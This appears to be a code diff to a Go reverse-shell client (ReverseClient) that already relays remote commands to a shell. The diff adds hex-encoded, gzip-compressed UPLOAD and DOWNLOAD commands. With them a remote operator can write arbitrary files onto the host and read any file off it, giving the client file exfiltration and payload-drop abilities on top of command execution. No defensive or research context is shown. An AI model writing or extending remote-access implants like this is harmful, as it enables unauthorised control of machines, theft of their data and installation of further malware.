@@ -2,10 +2,14 @@ package client
 
 import (
 	"bufio"
+	"bytes"
+	"compress/gzip"
 	"crypto/tls"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -19,6 +23,31 @@ type ReverseClient struct {
 	reader      *bufio.Reader
 	writer      *bufio.Writer
 	isConnected bool
+}
+
+func compressToHex(data []byte) (string, error) {
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	if _, err := gz.Write(data); err != nil {
+		return "", err
+	}
+	if err := gz.Close(); err != nil {
+		return "", err
+	}
+	return hex.EncodeToString(buf.Bytes()), nil
+}
+
+func decompressHex(payload string) ([]byte, error) {
+	compressed, err := hex.DecodeString(payload)
+	if err != nil {
+		return nil, err
+	}
+	gz, err := gzip.NewReader(bytes.NewReader(compressed))
+	if err != nil {
+		return nil, err
+	}
+	defer gz.Close()
+	return io.ReadAll(gz)
 }
 
 // NewReverseClient creates a new reverse client
@@ -107,6 +136,57 @@ func (rc *ReverseClient) HandleCommands() error {
 
 		if command == "exit" {
 			return nil
+		}
+
+		// handle file transfers before shell execution
+		if strings.HasPrefix(command, "UPLOAD ") {
+			parts := strings.SplitN(command, " ", 3)
+			if len(parts) != 3 {
+				rc.writer.WriteString("Invalid upload command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.Flush()
+				continue
+			}
+			remotePath := parts[1]
+			payload := parts[2]
+			data, err := decompressHex(payload)
+			if err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Decode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				continue
+			}
+			if err := os.WriteFile(remotePath, data, 0644); err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Write error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				continue
+			}
+			rc.writer.WriteString(fmt.Sprintf("Uploaded %d bytes to %s\n<<<END_OF_OUTPUT>>>\n", len(data), remotePath))
+			rc.writer.Flush()
+			continue
+		}
+
+		if strings.HasPrefix(command, "DOWNLOAD ") {
+			parts := strings.SplitN(command, " ", 2)
+			if len(parts) != 2 {
+				rc.writer.WriteString("Invalid download command\n<<<END_OF_OUTPUT>>>\n")
+				rc.writer.Flush()
+				continue
+			}
+			remotePath := parts[1]
+			data, err := os.ReadFile(remotePath)
+			if err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Read error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				continue
+			}
+			encoded, err := compressToHex(data)
+			if err != nil {
+				rc.writer.WriteString(fmt.Sprintf("Encode error: %v\n<<<END_OF_OUTPUT>>>\n", err))
+				rc.writer.Flush()
+				continue
+			}
+			rc.writer.WriteString(fmt.Sprintf("DATA %s\n<<<END_OF_OUTPUT>>>\n", encoded))
+			rc.writer.Flush()
+			continue
 		}
 
 		output := rc.ExecuteCommand(command)
